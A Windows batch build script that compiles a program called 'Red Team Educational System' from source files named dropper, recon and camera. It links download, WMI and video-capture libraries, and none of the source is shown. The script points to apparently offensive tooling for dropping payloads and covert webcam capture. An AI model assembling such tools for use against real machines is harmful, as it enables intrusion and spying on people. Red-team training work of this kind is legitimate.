@echo off
echo Compiling Red Team Educational System (Statically Linked /MT)...

:: Compile with /MT for static C Runtime and explicitly link all required libraries
cl.exe /nologo /MT /O2 /EHsc /DUNICODE /D_UNICODE "main.cpp" "..\Task 1\dropper.cpp" "..\Task 2\recon.cpp" "..\Task 3\camera.cpp" /link /OUT:RedSmartSystem.exe urlmon.lib wininet.lib mfplat.lib mf.lib mfreadwrite.lib mfuuid.lib ole32.lib user32.lib shell32.lib shlwapi.lib wbemuuid.lib comsuppw.lib Advapi32.lib


if %ERRORLEVEL% EQU 0 (
    echo Build successful. RedSmartSystem.exe created.
) else (
    echo Build failed.
)
pause
